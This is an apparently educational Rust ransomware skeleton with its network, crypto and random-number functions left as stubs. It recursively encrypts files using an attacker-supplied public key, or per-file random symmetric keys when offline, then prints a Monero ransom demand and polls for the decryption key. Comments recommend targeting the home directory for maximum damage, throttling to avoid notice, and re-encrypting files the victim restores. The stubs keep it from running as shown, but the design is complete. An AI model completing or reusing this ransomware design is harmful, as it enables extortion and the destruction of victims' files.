#![expect(dead_code)]

use std::{collections::HashMap, path::Path};

mod util;
#[allow(clippy::wildcard_imports)]
use util::*;

fn main() {
	// Asymmetric crypto is only good when the server generates the key-pair,
	// as it guarantees the private-key is unreachable by the victim.
	// By generating a key-pair instead of hard-coding it,
	// we ensure victims can't share keys.
	match request_pub_key() {
		Ok(pub_key) => {
			for file in match recur_read_dir(BASE_PATH) {
				Ok(r) => r,
				// Can't list any files,
				// so silently give up
				_ => return,
			} {
				let f = match file {
					Ok(d) => d.path(),
					_ => continue,
				};
				let _ = f_encrypt(false, &f, &pub_key);
				// avoid excessive CPU usage, to be less sus ඞ
				sleep(1500);
			}
			// Victim is pwned!
			msg();
			loop {
				if let Ok(priv_key) = request_priv_key(&pub_key) {
					for file in match recur_read_dir(BASE_PATH) {
						Ok(r) => r,
						_ => return,
					} {
						let f = match file {
							Ok(d) => d.path(),
							_ => continue,
						};
						let _ = f_decrypt(false, &f, &priv_key);
					}
					return;
				}
				sleep(120_000);
			}
		}
		// If we can't communicate with the server,
		// we must get the job done using symmetric crypto
		// because it's much faster and
		// the victim will have access to the key anyways.
		Err(e) => {
			// get default 128bit key,
			// suitable for symmetric crypto
			let Some(mut key) = gen_rand_bytes(16) else {
				// we need at least 1 key
				return;
			};
			let mut f_keys = HashMap::new();
			for file in match recur_read_dir(BASE_PATH) {
				Ok(r) => r,
				// Can't list any files,
				// so silently give up
				_ => return,
			} {
				let f = match file {
					Ok(d) => d.path(),
					_ => continue,
				};
				// Be as annoying and evil as possible 😈
				if let Some(k) = gen_rand_bytes(16) {
					key = k;
				}
				let _ = f_encrypt(true, &f, &key);
				// associate keys with files,
				// so that they can be decrypted later
				f_keys.insert(f, key.clone());
				// reduce syscall frequency, to be less sus ඞ
				sleep(500);
			}
			// Victim is pwned!
			msg();
			loop {
				// TO-DO: find some way to detect when victim pays.
				// This is much harder to get right with symmetric crypto
				sleep(u64::MAX);
				// BONUS: re-encrypt files whenever the victim decrypts them!
				// That can be done by watching for file updates in `BASE_PATH`
			}
		}
	}
}

/// Working-Dir used as example.
/// I recommend `HOME` for low-privilege max-damage
const BASE_PATH: &str = ".";

#[expect(clippy::doc_markdown)]
/// network request error
enum NetReqE {
	/// Connection blocked client-side.
	/// Could be at sys-call level by a sandbox,
	/// or at network layer by a firewall.
	Forbidden,
	/// Not connected to any network at all
	NoNet,
	/// LAN, but no WAN
	NoInternet,
	/// Server is overloaded, or blocking a DDoS
	Busy,
	/// Server refused
	Reject,
	/// Server doesn't exist
	NotFound,
}

/// Ask the attacker's server for a public-key
fn request_pub_key() -> Result<Box<[u8]>, NetReqE> {
	// Obviously, the code must connect to a network.
	todo!()
	// When the server recieves the request,
	// it should assume it's the "1st time" for this device,
	// so it should always generate a random key-pair.
}
/// Ask the attacker's server for the private-key associated with
/// this public-key.
/// This must only return `Ok` if the victim has payed
fn request_priv_key(pub_key: &[u8]) -> Result<Box<[u8]>, NetReqE> {
	// Obviously, the code must connect to a network.
	todo!()
}

/// Returns `None` if it can't find an entropy source.
fn gen_rand_bytes(size: usize) -> Option<Box<[u8]>> {
	todo!()
	// By allocating boxes,
	// we hope that it's harder to search keys in a memory-dump.
}

/// File-system error
enum FSe {
	/// Only applicable if the encryptor must
	/// load the whole file in memory.
	/// As this is impossible with buffering.
	TooBig,
	/// Race-condition. File no longer exists.
	NoSuchF,
	/// No permission to read
	BlockedRead,
	/// No permission to modify
	BlockedWrite,
}

fn f_encrypt(symmetric: bool, file: &Path, key: &[u8]) -> Result<(), FSe> {
	todo!()
}
fn f_decrypt(symmetric: bool, file: &Path, key: &[u8]) -> Result<(), FSe> {
	todo!()
}

/// Inform the victim in any way.
/// This just writes to `stdout`,
/// but you could communicate with the user in additional ways,
/// such as GUI pop-ups or the wallpaper.
fn msg() {
	// XMR used as example, because it's super anon
	println!(
		"Your files have been encrypted!
		Pay the ransom at this Monero address:
		{CC_ADDR}
		If you kill this process, you won't recover your files!"
	);
}

/// Your crypto-currency address of choice
const CC_ADDR: &str = "HEXADECIMAL BABBLE";
// Government money is easy to track
